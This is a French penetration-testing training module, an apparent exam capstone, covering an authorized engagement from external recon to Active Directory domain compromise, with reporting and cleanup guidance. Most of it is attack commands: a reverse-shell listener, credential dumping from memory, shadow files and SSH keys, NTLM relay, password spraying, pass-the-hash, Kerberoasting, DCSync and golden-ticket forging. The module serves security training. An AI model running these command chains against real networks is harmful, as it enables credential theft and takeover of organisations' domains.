# 28 — Attacking Enterprise Networks (Capstone)

## Objectifs
Mener un engagement complet, de l'externe au Domain Admin : méthodologie, priorisation, pivoting, AD, rapport. Ce module synthétise tous les précédents.

---

## 1. Cycle complet

```
External recon
   ↓
Perimeter foothold (web / VPN / mail)
   ↓
Internal recon (pivot)
   ↓
Credential access
   ↓
Lateral movement
   ↓
Privilege escalation
   ↓
Domain compromise
   ↓
Evidence & reporting
```

---

## 2. Phase 1 — Recon externe

```bash
# Domaines / sous-domaines / emails
subfinder -d <DOMAIN> -all -silent | httpx -silent -o live.txt
amass enum -passive -d <DOMAIN>
theHarvester -d <DOMAIN> -b all

# Services exposés
nmap -sS -sV -p- --min-rate 2000 -oA external <PUBLIC_IP>

# Web
whatweb -a 3 https://<DOMAIN>
ffuf -u https://<DOMAIN>/FUZZ -w raft-medium-directories.txt -mc 200,301,302,403

# Fuites
curl -s "https://crt.sh/?q=%25.<DOMAIN>&output=json" | jq -r '.[].name_value' | sort -u
waybackurls <DOMAIN> | tee wayback.txt
```

### Points d'entrée typiques
- VPN (credential stuffing / CVE)
- Web app (SQLi, upload, RCE)
- Messagerie (OWA, Exchange)
- Services exposés (RDP, SSH, FTP)
- Credentials fuités (breach, GitHub)

---

## 3. Phase 2 — Foothold

```bash
# Web
# - SQLi → dump → creds
# - Upload → web shell → reverse
# - RCE (CVE) → shell
# - LFI → logs → RCE

# Obtenir un shell stable
rlwrap nc -lvnp 4444
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

### Première énumération post-foothold
```bash
id; whoami; hostname; uname -a
ip a; ip route; cat /etc/hosts
ss -tulpn
env; cat ~/.bash_history
sudo -l
find / -name "*.conf" 2>/dev/null | head
```

```cmd
whoami /all
systeminfo
ipconfig /all
route print
net user; net localgroup administrators
```

---

## 4. Phase 3 — Pivot & cartographie interne

```bash
# Réseaux accessibles depuis le pivot
ip a; ip route
arp -a

# Tunnel
ssh -D 1080 <USER>@<PIVOT>
# ou chisel / ligolo

# Scan interne
proxychains4 nmap -sT -Pn -p21,22,80,139,443,445,1433,3306,3389,5985 10.10.10.0/24
```

### Priorisation des cibles
1. Contrôleurs de domaine
2. Serveurs de fichiers / backup
3. Serveurs web / applicatifs
4. Postes utilisateurs (credentials)
5. Équipements réseau / management

---

## 5. Phase 4 — Credential access

```bash
# Windows local
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<TARGET>
mimikatz → sekurlsa::logonpasswords

# Linux
cat /etc/shadow
find / -name "id_rsa" 2>/dev/null
grep -ri "password" /var/www /opt /home 2>/dev/null

# Réseau
responder -I tun0
impacket-ntlmrelayx -tf targets.txt -smb2support

# AD
impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
netexec smb <DC_IP> -u users.txt -p 'Password123' --continue-on-success
```

### Réutilisation
```bash
# Spray léger et surveillé
netexec smb 10.10.10.0/24 -u users.txt -p 'Winter2026!' --continue-on-success
# PtH
netexec smb 10.10.10.0/24 -u <USER> -H <NTHASH> --continue-on-success
```

---

## 6. Phase 5 — Lateral movement

```bash
# SMB / WMI / WinRM
impacket-psexec <DOMAIN>/<USER>:<PASS>@<TARGET>
impacket-wmiexec <DOMAIN>/<USER>:<PASS>@<TARGET>
evil-winrm -i <TARGET> -u <USER> -p <PASS>

# Depuis Linux vers Windows
netexec smb <TARGET> -u <USER> -p <PASS> -x whoami

# RDP
xfreerdp /v:<TARGET> /u:<USER> /p:<PASS> /d:<DOMAIN>
```

### BloodHound
```bash
bloodhound-python -u <USER> -p <PASS> -d <DOMAIN> -ns <DC_IP> -c All
# Importer → "Shortest Paths to Domain Admins"
```

---

## 7. Phase 6 — Domain compromise

```bash
# Kerberoast
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC_IP> -request
hashcat -m 13100 kerb.txt <WORDLIST>

# ACL / ADCS
certipy-ad find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable
impacket-dacledit -action write -rights DCSync -principal <USER> -target-dn "DC=<DOMAIN>,DC=htb" <DOMAIN>/<USER>:<PASS>

# DCSync
impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP> -just-dc

# Golden ticket
impacket-ticketer -nthash <KRBTGT> -domain-sid <SID> -domain <DOMAIN> Administrator
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass <DOMAIN>/Administrator@<DC_FQDN>
```

### Objectifs de preuve
- Accès au DC (SYSTEM / DA)
- `krbtgt` hash (impact maximal)
- Données sensibles (simulées)
- Chemin d'attaque documenté

---

## 8. Gestion de l'engagement

### Journal
```bash
script -q -a engage_$(date +%F).log
```
- Une note par hôte / finding.
- Horodatage systématique.
- Sauvegarde des sorties brutes.

### Règles
- Ne pas dépasser le scope.
- Pas de persistance non autorisée.
- Pas de DoS, pas de modification de données.
- Signaler immédiatement un incident critique.
- Nettoyer comptes, fichiers, tâches, tunnels.

### Nettoyage
```bash
# Linux
crontab -r
rm -f /tmp/shell* /tmp/linpeas*
# Windows
schtasks /delete /tn <TASK> /f
del C:\Temp\shell.exe
net user <CREATED_USER> /delete
# Tunnels
pkill chisel; pkill ligolo; pkill ssh
```

---

## 9. Rapport & restitution

Voir module 27. Points spécifiques au capstone :
- **Attack narrative** : chaîne complète, du premier accès au DA.
- **Attack path diagram** : visuel des rebonds.
- **Détail par hôte** : accès, privilèges, données.
- **Impact consolidé** : compromission totale du domaine.
- **Remédiations par couche** : périmètre, identité, segmentation, détection.

### Diagramme de chemin
```
Internet → web01 (CVE-2021-41773)
        → creds www-data
        → pivot 10.10.10.0/24
        → fs01 (SMB relay)
        → creds svc_backup
        → DC01 (Kerberoast + DCSync)
        → Domain Admin
```

---

## 10. Checklist complète d'engagement

### Avant
- [ ] Scope signé, RoE lues
- [ ] Contacts d'urgence
- [ ] Outils et wordlists prêts
- [ ] Journalisation active

### Pendant
- [ ] Recon externe complète
- [ ] Foothold obtenu et stable
- [ ] Cartographie interne
- [ ] Credentials collectés et réutilisés
- [ ] Chemins BloodHound analysés
- [ ] Escalade jusqu'à l'objectif
- [ ] Preuves horodatées

### Après
- [ ] Artefacts nettoyés
- [ ] Timeline reconstituée
- [ ] Findings validés
- [ ] Rapport rédigé et relu
- [ ] Restitution planifiée

---

## 11. Erreurs classiques en exam

| Erreur | Correction |
|---|---|
| S'acharner sur un service | noter et passer au suivant |
| Ignorer les creds trouvés | les tester partout (spray/PtH) |
| Oublier BloodHound | collecter tôt |
| Tunnel instable | ligolo-ng plutôt que proxychains |
| Pas de notes | journal en continu |
| Sortir du scope | vérifier chaque IP |
| Nettoyer trop tard | documenter au fur et à mesure |
| Négliger le rapport | 30 % de la note |

## Philosophie
> Un pentest réussi n'est pas « avoir un shell » : c'est **prouver l'impact**, **documenter le chemin** et **permettre la remédiation**.
